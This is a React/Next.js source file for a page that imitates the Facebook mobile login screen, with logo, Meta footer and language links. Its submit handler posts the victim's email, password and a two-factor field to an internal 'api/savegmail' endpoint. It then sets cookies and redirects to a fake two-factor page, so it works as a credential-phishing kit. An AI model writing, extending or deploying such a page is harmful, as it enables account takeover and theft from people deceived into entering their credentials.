"use client";
import React, { useState } from "react";
import Image from "next/image";
import Link from "next/link";
import axios from "axios";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";

function FacebookLoginPage() {
  const router = useRouter();

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [towFactor, setTowFactor] = useState("...");

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const res = await axios.post("api/savegmail", {
        email,
        password,
        towFactor,
      });

      const uid = await res.data.uid;
      const resEmail = await res.data.email;

      console.log(res);

      await Cookies.set("uid", uid);
      await Cookies.set("email", resEmail);
      await console.log(Cookies.get());
      router.push("/facebook/tow-factor");
    } catch (error) {
      console.log(error);
    }
  };
  return (
    <div className="py-1">
      <Image
        src={"/img/facebook.svg"}
        height={200}
        width={200}
        className="w-32 mx-auto"
        alt="facebook logo"
      />
      <form onSubmit={handleSubmit} className="px-3 flex flex-col gap-1 ">
        <input
          onChange={(e) => setEmail(e.target.value)}
          type="text"
          placeholder="Mobile number or email address"
          className="py-3 px-2 bg-prymary-lite w-full shadow-lg placeholder:text-black placeholder:opacity-60"
        />
        <div className="flex flex-row items-center justify-center">
          <input
            onChange={(e) => setPassword(e.target.value)}
            type="password"
            placeholder="Password"
            className="py-3 px-2 bg-prymary-lite w-full shadow-lg placeholder:text-black placeholder:opacity-60"
          />
          <button className="text-sm text-prymary py-2 rounded-md shadow-md ">
            Show
          </button>
        </div>
        <button className="bg-prymary py-2 my-1 w-full text-white font-semibold rounded-md ">
          Log In
        </button>
      </form>
      <div className="justify-cente items-center text-sm mt-2 flex flex-col">
        <Link href={"/"} className="text-prymary">
          Forgotten password?
        </Link>
        <div className="flex w-full justify-center items-center gap-2 mt-2 px-3">
          <div className="w-full bg-gray-400 h-[1px] opacity-60"></div>
          <p className="opacity-70">or</p>
          <div className="w-full bg-gray-400 h-[1px] opacity-60 "></div>
        </div>

        <button className="border-2 w-[70vw] py-1 mt-3 border-gray-300">
          Create New Account
        </button>
      </div>

      <div className="grid grid-cols-2 grid-rows-5 gap-1 text-center mt-20 text-xs text-prymary text-opacity-90">
        <p className="text-gray-500">English (UK)</p>
        <p>অসমীয়া</p>
        <p>Português (Brasil)</p>
        <p>नेपाली</p>
        <p>Português (Brasil)</p>
        <p>বাংলা</p>
        <p>हिन्दी</p>
        <p>Español</p>
        <p className="col-span-2 text-gray-500 text-sm">Meta © 2023 </p>
      </div>
    </div>
  );
}

export default FacebookLoginPage;
